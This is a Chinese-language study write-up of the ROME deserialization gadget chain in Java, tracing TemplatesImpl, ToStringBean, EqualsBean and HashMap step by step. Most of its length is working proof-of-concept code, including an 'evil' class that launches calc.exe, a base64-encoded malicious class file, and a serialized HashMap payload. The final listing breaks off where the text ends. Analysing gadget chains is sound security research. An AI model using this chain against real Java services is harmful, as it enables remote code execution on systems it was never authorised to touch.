# 基础 ROME 链

ROME 是一个可以兼容多种格式的 feeds 解析器，可以从一种格式转换成另一种格式，也可返回指定格式或 Java 对象。ROME 兼容了 RSS (0.90, 0.91, 0.92, 0.93, 0.94, 1.0, 2.0), Atom 0.3 以及 Atom 1.0 feeds 格式。

Rome 提供了 **`ToStringBean`** 这个类，提供深入的 `toString` 方法对 JavaBean 进行操作。

# Demo环境

JDK8u201

新建 maven 项目，引入 rome 依赖

```xml
<dependencies>
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.19.0-GA</version>
        </dependency>

        <dependency>
            <groupId>rome</groupId>
            <artifactId>rome</artifactId>
            <version>1.0</version>
        </dependency>
    </dependencies>
```

# ysoserial Rome Gadget

ysoserial 中提供了对 Rome 链的利用，Gadget 如下：

```
/**
 *
 * TemplatesImpl.getOutputProperties()
 * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
 * NativeMethodAccessorImpl.invoke(Object, Object[])
 * DelegatingMethodAccessorImpl.invoke(Object, Object[])
 * Method.invoke(Object, Object...)
 * ToStringBean.toString(String)
 * ToStringBean.toString()
 * ObjectBean.toString()
 * EqualsBean.beanHashCode()
 * ObjectBean.hashCode()
 * HashMap<K,V>.hash(Object)
 * HashMap<K,V>.readObject(ObjectInputStream)
 *
 * @author mbechler
 *
 */
```

调用由下至上

# Rome链剖析

该剖析非全部按照 ysoserial Rome Gadget 的顺序，有些调用可以省略的就 pass 了。

## TemplatesImpl加载恶意字节码

从 ysoserial 的 Gadget 可以知道，Rome 链最后还是用 `TemplatesImpl` 加载恶意字节码实现 RCE，复习一下这条调用链，这里不再细锁

```
TemplatesImpl#getOutputProperties()
	-> TemplatesImpl#newTransformer() 
		-> TemplatesImpl#getTransletInstance() 
			-> TemplatesImpl#defineTransletClasses()
				-> TransletClassLoader#defineClass()
```

生成字节码：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class evil extends AbstractTranslet {
    public void transform(DOM document, SerializationHandler[] handlers)
            throws TransletException {}
    public void transform(DOM document, DTMAxisIterator iterator,
                          SerializationHandler handler) throws TransletException {}
    public evil() throws Exception{
        super();
        String[] command = {"calc.exe"};
        Runtime.getRuntime().exec(command);
    }
}
```

javac 编译后将拿到的 evil.class 进行 base64 加密

直接调用 `TemplatesImpl#getOutputProperties()`

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;

import java.util.Base64;

public class Test {

		public static void setValue(Object target, String name, Object value) throws Exception {
        Class c = target.getClass();
        Field field = c.getDeclaredField(name);
        field.setAccessible(true);
        field.set(target,value);
    }

    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT");
        setValue(templates,"_name", "aaa");
        setValue(templates, "_bytecodes", new byte[][]{code});
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

        templates.getOutputProperties();
    }
}
```

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled.png)

## ToStringBean#toString(String)→TemplatesImpl#getOutputProperties()

ysoserial 通过 `ToStringBean#toString(String)` 调用到了 `TemplatesImpl#getOutputProperties()`

`ToStringBean#toString(String)`源码：

```java
private String toString(String prefix) {
        StringBuffer sb = new StringBuffer(128);
        try {
            PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);
            if (pds!=null) {
                for (int i=0;i<pds.length;i++) {
                    String pName = pds[i].getName();
                    Method pReadMethod = pds[i].getReadMethod();
                    if (pReadMethod!=null &&                             // ensure it has a getter method
                        pReadMethod.getDeclaringClass()!=Object.class && // filter Object.class getter methods
                        pReadMethod.getParameterTypes().length==0) {     // filter getter methods that take parameters
                        Object value = pReadMethod.invoke(_obj,NO_PARAMS);
                        printProperty(sb,prefix+"."+pName,value);
                    }
                }
            }
        }
        catch (Exception ex) {
            sb.append("\n\nEXCEPTION: Could not complete "+_obj.getClass()+".toString(): "+ex.getMessage()+"\n");
        }
        return sb.toString();
    }
```

对这条链子来说有用部分在 `try` 里，分析下代码功能

1. 首先是 `PropertyDescriptor[] pds = BeanIntrospector.*getPropertyDescriptors*(_beanClass);`

`ToStringBean#_beanClass` 是私用的 Class 类型的成员

`BeanIntrospector#getPropertyDescriptors(Class)`：

```java
public class BeanIntrospector {

    private static final Map _introspected = new HashMap();

    public static synchronized PropertyDescriptor[] getPropertyDescriptors(Class klass) throws IntrospectionException {
        PropertyDescriptor[] descriptors = (PropertyDescriptor[]) _introspected.get(klass);
        if (descriptors==null) {
            descriptors = getPDs(klass);
            _introspected.put(klass,descriptors);
        }
        return descriptors;
    }

...
}
```

函数返回的是 `PropertyDescriptor` 类型数组 `descriptors`，只看对他的操作就好，`BeanIntrospector#getPDs(Class)`：

```java
private static PropertyDescriptor[] getPDs(Class klass) throws IntrospectionException {
        Method[] methods = klass.getMethods();
        Map getters = getPDs(methods,false);
        Map setters = getPDs(methods,true);
        List pds     = merge(getters,setters);
        PropertyDescriptor[] array = new PropertyDescriptor[pds.size()];
        pds.toArray(array);
        return array;
    }
```

`getPDs(Class)` 首先会将 `klass` 中所有方法提取出来放到 method 数组中，然后两次调用 `BeanIntrospector#getPDs(Method[],boolean)`：

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%201.png)

其功能是会将所有以 `**set**`、**`get`**、**`is`** 为开头的方法整理到 HashMap 结构中并返回。

`getPDs(Class)` 再会把两个 HashMap 加入到 `PropertyDescriptor` 

简单总结，最后 `pds` 就包含 `_beanClass` 中所有的 *`SETTER`、**`GETTER`* 方法了。

1. 

```java
if (pds!=null) {
	for (int i=0;i<pds.length;i++) {
		String pName = pds[i].getName();
	  Method pReadMethod = pds[i].getReadMethod();
			if (pReadMethod!=null &&                         // ensure it has a getter method
			pReadMethod.getDeclaringClass()!=Object.class && // filter Object.class getter methods
			pReadMethod.getParameterTypes().length==0) {     // filter getter methods that take parameters
				Object value = pReadMethod.invoke(_obj,NO_PARAMS);
	      printProperty(sb,prefix+"."+pName,value);
  }
}
```

这里对 `pds` 做了循环遍历，可以看到最后有 `pReadMethod.invoke(_obj,NO_PARAMS)`，这里就是执行方法的地方，执行了 `_obj` 对象的 `pReadMethod` 方法

- `_obj` 在实例化 `ToStringBean` 时可被赋值；
- `pReadMethod` 在前面通过 `pds#getReadMethod()` 拿到了 pds 中的函数

`getReadMethod()` 顾名思义，拿到 `PropertyDescriptor` 这个类中 `ReadMethod` 相关值，其实就是 getter 方法，Read ≈ Get，手动调试的时候就明白了

判断中要求这个 getter 方法不能是 Object.class 的 getter，并且要是个无参方法，满足这两点那么就可以调用该方法

所以说如果 `ToStringBean#_obj` 是我们已经构造好的恶意 `TemplatesImpl` 类，而 `ToStringBean#_beanClass` 为 `TemplatesImpl.class`，那么循环执行到 `getOutputProperties()`，就可以一步步加载恶意字节码了

## ToStringBean#toString()→ToStringBean#toString(String)

`ToStringBean#toString(String)` 是个私有方法，需要从内部调用，这里就需要 `ToStringBean#toString()`

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%202.png)

获取 `_obj` 的类名，因为我们传给 `_obj` 是一个 `TemplatesImpl` 类，相当于最后调了`toString(TemplatesImpl)`

## 手动调用ToStringBean#toString()

直接给出代码

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;

import java.lang.reflect.Field;

import java.util.Base64;

public class Test {

		public static void setValue(Object target, String name, Object value) throws Exception {
        Class c = target.getClass();
        Field field = c.getDeclaredField(name);
        field.setAccessible(true);
        field.set(target,value);
    }

    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT");
        setValue(templates,"_name", "aaa");
        setValue(templates, "_bytecodes", new byte[][]{code});
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

//        templates.getOutputProperties();

				ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class,templates);
        toStringBean.toString();
    }
}
```

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%203.png)

跟一下过程，在 `toStringBean.toString();` 处下个断点，步过看看 pds 中有什么

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%204.png)

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%205.png)

`pds[2].readMethodName=getOutputProperties`，直接跳到 i = 2

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%206.png)

## EqualsBean.beanHashCode()→ToStringBean#toString()

`EqualsBean.hashCode()`：

```java
public class EqualsBean implements Serializable {

    private static final Object[] NO_PARAMS = new Ob

    private Class _beanClass;
    private Object _obj;

		...

		public int beanHashCode() {
        return _obj.toString().hashCode();
    }
		
		...
}
```

只要在实例化 `EqualsBean` 类时给 `_obj` 赋值为刚刚的 `toStringBean` 即可，不过这里要注意的一点是 `_beanClass` 必须为 `ToStringBean.class`，这是在构造函数中规定的：

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%207.png)

构造函数会检查 obj 是不是 beanClass 的实例，如果不是则会抛出一个报错

## 手动调用EqualsBean.beanHashCode()

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;
import com.sun.syndication.feed.impl.EqualsBean;

import java.lang.reflect.Field;

import java.util.Base64;

public class Test {

		public static void setValue(Object target, String name, Object value) throws Exception {
        Class c = target.getClass();
        Field field = c.getDeclaredField(name);
        field.setAccessible(true);
        field.set(target,value);
    }

    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT");
        setValue(templates,"_name", "aaa");
        setValue(templates, "_bytecodes", new byte[][]{code});
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

//        templates.getOutputProperties();

				ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class,templates);
//        toStringBean.toString();

				EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
        equalsBean.beanHashCode();
    }
}
```

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%208.png)

## 反序列化入口

在 ROME 链中，是以 `HashMap` 的 `readObject` 作为反序列化入口点的。而我们知道，以 `HashMap` 作为入口点的结果就是能调用任意类的 `hashCode()`
那么通过 `HashMap` 调用 `EqualsBean#hashCode()` 是否可行？

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%209.png)

答案是肯定的。

那么这条链子可以简化为：

```
HashMap<K,V>.readObject(ObjectInputStream)
	->HashMap<K,V>.hash(Object)
		->EqualsBean.hashCode()
			->EqualsBean.beanHashCode()
				->ToStringBean.toString()
					->ToStringBean.toString(String)
						->TemplatesImpl.getOutputProperties()
							...
```

手动触发 `EqualsBean#hashCode()`

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%2010.png)

## 手动触发Gadget

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;
import com.sun.syndication.feed.impl.EqualsBean;

import java.lang.reflect.Field;
import java.util.HashMap;

import java.util.Base64;

public class Test {

		public static void setValue(Object target, String name, Object value) throws Exception {
        Class c = target.getClass();
        Field field = c.getDeclaredField(name);
        field.setAccessible(true);
        field.set(target,value);
    }

    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT");
        setValue(templates,"_name", "aaa");
        setValue(templates, "_bytecodes", new byte[][]{code});
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

//        templates.getOutputProperties();

				ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class,templates);
//        toStringBean.toString();

				EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
//        equalsBean.beanHashCode();

				HashMap<Object, Object> map = new HashMap<>();
        map.put(equalsBean, "Gadget");
    }
}
```

手动触发利用链其实就是找执行 `HashMap#hash(Object)` 的点

```java
static final int hash(Object key) {
	int h;
  return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}
```

这就得用到 `HashMap#put()`

```java
public V put(K key, V value) {
	return putVal(hash(key), key, value, false, true);
}
```

这样既可以把我们构造好的 `equalsBean` 加入到 `HashMap` 中，也可以完成手调，看效果：

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%2011.png)

下断点调试

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%2012.png)

执行后 `map` 中的内容

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%2013.png)

## 反序列化触发Gadget

加入一段序列化反序列化代码，如下：

```java
//序列化
ByteArrayOutputStream barr = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(barr);
oos.writeObject(**map**);
oos.close();

//反序列化
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
Object o = (Object)ois.readObject();
```

反序列化时调用到 `HashMap#readObject`，执行到 for 循环后进入调用链

![Untitled](%E5%9F%BA%E7%A1%80%20ROME%20%E9%93%BE%20fa57e187ebc84d0896feedb61a6b8e78/Untitled%2014.png)

因为我们之前执行了 `map.put(equalsBean, "Gadget")`，所以 map 中有一对键值对，肯定会进入这个循环。

## 遇到两个问题以及最终 POC

第一个显而易见的问题就是，`map.put` 会触发一遍 Gadget，而反序列化 `ois.readOject` 也会触发一遍 Gadget，解决办法就是：先不装入我们构造好恶意字节码的 `TemplatesImpl` 类，反而先装一个无害 `TemplatesImpl` 类，最后在 `map.put` 后，利用反射将这个无害 `TemplatesImpl` 替换，代码（加粗）：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;
import com.sun.syndication.feed.impl.EqualsBean;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;

import java.util.Base64;

import javax.xml.transform.Templates;

public class Test2 {

    public static void setValue(Object target, String name, Object value) throws Exception {
        Class c = target.getClass();
        Field field = c.getDeclaredField(name);
        field.setAccessible(true);
        field.set(target,value);
    }

    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIwoABwAUBwAVCAAWCgAXABgKABcAGQcAGgcAGwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAcAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHQEAClNvdXJjZUZpbGUBAAlldmlsLmphdmEMAA8AEAEAEGphdmEvbGFuZy9TdHJpbmcBAAhjYWxjLmV4ZQcAHgwAHwAgDAAhACIBABN5c29zZXJpYWwvdGVzdC9ldmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAwABAAgACQACAAoAAAAZAAAAAwAAAAGxAAAAAQALAAAABgABAAAACwAMAAAABAABAA0AAQAIAA4AAgAKAAAAGQAAAAQAAAABsQAAAAEACwAAAAYAAQAAAA0ADAAAAAQAAQANAAEADwAQAAIACgAAADsABAACAAAAFyq3AAEEvQACWQMSA1NMuAAEK7YABVexAAAAAQALAAAAEgAEAAAADwAEABAADgARABYAEgAMAAAABAABABEAAQASAAAAAgAT");
        setValue(templates,"_name", "aaa");
        setValue(templates, "_bytecodes", new byte[][]{code});
        setValue(templates,"_tfactory", new TransformerFactoryImpl());

//        templates.getOutputProperties();

        ToStringBean toStringBean = new ToStringBean(TemplatesImpl.class,**new TemplatesImpl()**);
//        toStringBean.toString();

        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
//        equalsBean.beanHashCode();

        HashMap<Object, Object> map = new HashMap<>();
        map.put(equalsBean, "Gadget");

        **setValue(toStringBean, "_obj", templates);**

        //序列化
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(map);
        oos.close();

        //反序列化
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();

    }
}
```

再将该 POC 拿去跑，我可以发现它并不会弹出 calc。

原因出在：

```java
ToStringBean toStringBean = new ToStringBean(**TemplatesImpl.class**,new TemplatesImpl());
```

前面也分析过 `ToStringBean#toString(String)` 会提取 `TemplatesImpl.class` 中所有 setter 和 getter 方法，并执行其中的 getter 方法，我们需要利用其这个机制调用到 `TemplatesImpl#getOutputProperties()`

但是前面调试中也看到了 `TemplatesImpl` 这个类有很多 getter 方法，`getOutputProperties` 被提取出来后存放在 `pds[2]` 这个位置中，所以很有可能是在调用 `pds[0]` 或 `pds[1]` 的 getter 过程中产生了一些错误导致没有执行到 `pds[2]` 这个地方。

我在自己调时候也没有弄清楚，看师傅们的文章也没有具体讲出原因来的，所以自行研究吧。

解决办法就是用 `Templates.class` 替代 `TemplatesImpl.class`。

`Templates` 是 `TemplatesImpl` 所继承的接口，它只有一个 getter 就是 `getOutputProperties()`，能够排除其他干扰因素。

所以最终POC如下：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.ToStringBean;
import com.sun.syndication.feed.impl.EqualsBean;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;

import java.util.Base64;

import javax.xml.transform.Templates;

public class Test2 {

    public static void setValue(Object target, String name, Object value) throws Exception {
        Class c = target.getClass();
        Field field = c.getDeclaredField(name);
        field.setAccessible(true);
        field.set(target,value);
    }

    public static void main(String[] args) throws Exception {

